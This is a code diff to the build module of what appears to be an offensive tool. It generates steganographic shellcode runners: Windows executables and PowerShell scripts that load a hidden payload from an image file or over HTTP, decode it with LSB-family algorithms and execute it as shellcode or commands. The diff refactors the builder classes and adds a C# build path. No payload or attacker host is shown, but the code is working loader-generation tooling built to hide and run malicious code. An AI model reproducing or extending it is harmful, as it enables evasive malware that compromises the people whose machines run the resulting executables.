@@ -13,14 +13,14 @@ from algorithms.LSBX import Channel
 
 @dataclass
 class Runner:
-    """Shellcode runner. Knows how to build itself"""
+    """Payload runner. Used as a config for Builder"""
     name: str
     os: str
     arch: str
 
     language: str
-    delivery_method: str
-    payload_type: str
+    image_source: str
+    payload: str
     algorithm: str
 
     params: dict = field(default_factory=dict)
@@ -32,10 +32,10 @@ class Runner:
 
     @property
     def sources(self):
-        return os.path.join('readers', self.language)
+        return os.path.join('runners', self.language)
 
     def __str__(self):
-        return f'{self.name} ({self.os}/{self.arch}/{self.language}/{self.payload_type}, ' \
+        return f'{self.name} ({self.os}/{self.arch}/{self.language}/{self.payload}, ' \
                f'algorithm={self.algorithm}, params={self.params})'
 
 
@@ -54,6 +54,7 @@ def get_runner(runner_config: str, **kwargs):
 
 
 class Builder:
+    """A language-specific templating engine"""
     template_file = ''
     sources_extension = ''
     build_extension = 'exe'
@@ -124,7 +125,7 @@ class Builder:
 
 
 class CppBuilder(Builder):
-    template_file = 'cpp/reader.cpp.template'
+    template_file = 'cpp/reader.cpp.mst'
     sources_extension = 'cpp'
     compilers = {
         'x86': '/usr/bin/i686-w64-mingw32-g++',
@@ -141,7 +142,7 @@ class CppBuilder(Builder):
         super().preprocess_sources()
 
     def run_build(self):
-        libs = ['gdiplus'] + self.libs[self.runner.delivery_method] + self.libs[self.runner.payload_type]
+        libs = ['gdiplus'] + self.libs[self.runner.image_source] + self.libs[self.runner.payload]
         libs = set(libs)
         libs = ' '.join(f'-l{lib} -Wl,-Bstatic' for lib in libs)
         os.popen(
@@ -155,16 +156,61 @@ class CppBuilder(Builder):
 
 
 class CSharpBuilder(Builder):
-    template_file = 'csharp/Program.cs'
+    template_file = 'csharp/runner.cs.mst'
     sources_extension = 'cs'
+    build_dir = '.'
 
-    def build(self):
-        os.popen(f'mcs -platform:{self.runner.arch} -reference:System.Drawing {self.build_dir}/{self.runner.name}')
+    # TODO: drop templated .cs file to csharp/
+    # TODO: mcs includes
+
+    def preprocess_sources(self):
+        class_mapping = {
+            'image_sources': {
+                'image_file': 'ImageFile',
+                'httpx': 'HTTPX'
+            },
+            'payloads': {
+                'shellcode': 'Shellcode',
+                'cmd': 'Cmd'
+            },
+            'algorithms': {
+                'LSB': 'LSB',
+                'LSBM': 'LSBM',
+                'LSBX': 'LSBX',
+                'ColorCode': 'ColorCode'
+            }
+        }
+
+        self.runner.params.update({
+            'image_source': class_mapping['image_sources'][self.runner.image_source],
+            'payload': class_mapping['payloads'][self.runner.payload],
+            'algorithm': self.runner.algorithm
+        })
+
+        self.runner.name = f'csharp/{self.runner.name}'
+
+        try:
+            args = self.runner.params['args']
+            self.runner.params.update({
+                'image_source_args': args.get('image_source'),
+                'algorithm_args': args.get('algorithm'),
+                'payload_args': args.get('payload'),
+            })
+        except KeyError:
+            pass
+
+        super().preprocess_sources()
+
+    def run_build(self):
+        os.chdir('csharp')
+        os.popen(f'mcs -platform:{self.runner.arch} '
+                 f'-reference:System.Drawing '
+                 f'{self.build_dir}/{self.runner.name}')
 
 
 class GoBuilder(Builder):
     build_dir = '.'
-    template_file = 'runner.go.template'
+    template_file = 'runner.go.mst'
     sources_extension = 'go'
     architectures = {
         'x86': '386',
@@ -177,8 +223,8 @@ class GoBuilder(Builder):
     def run_build(self):
         tags = ','.join([
             f'payload_algorithm_{self.runner.algorithm.lower()}',
-            f'delivery_method_{self.runner.delivery_method.lower()}',
-            f'payload_type_{self.runner.payload_type.lower()}'
+            f'delivery_method_{self.runner.image_source.lower()}',
+            f'payload_type_{self.runner.payload.lower()}'
         ])
 
         o = subprocess.run(
@@ -198,7 +244,7 @@ class GoBuilder(Builder):
 
 
 class PowershellBuilder(Builder):
-    template_file = 'template.ps1'
+    template_file = 'runner.ps1.mst'
     sources_extension = 'ps1'
     build_extension = sources_extension
 
@@ -206,10 +252,10 @@ class PowershellBuilder(Builder):
         with open(f'algorithms/{self.runner.algorithm.lower()}.{self.sources_extension}') as f:
             self.runner.params.update({'ALGORITHM_CODE': chevron.render(f.read(), self.runner.params)})
 
-        with open(f'delivery_methods/{self.runner.delivery_method.lower()}.{self.sources_extension}') as f:
+        with open(f'delivery_methods/{self.runner.image_source.lower()}.{self.sources_extension}') as f:
             self.runner.params.update({'PAYLOAD_DELIVERY_CODE': chevron.render(f.read(), self.runner.params)})
 
-        with open(f'payload_types/{self.runner.payload_type.lower()}.{self.sources_extension}') as f:
+        with open(f'payloads/{self.runner.payload.lower()}.{self.sources_extension}') as f:
             self.runner.params.update({'PAYLOAD_EXEC_CODE': chevron.render(f.read(), self.runner.params)})
 
         super().preprocess_sources()
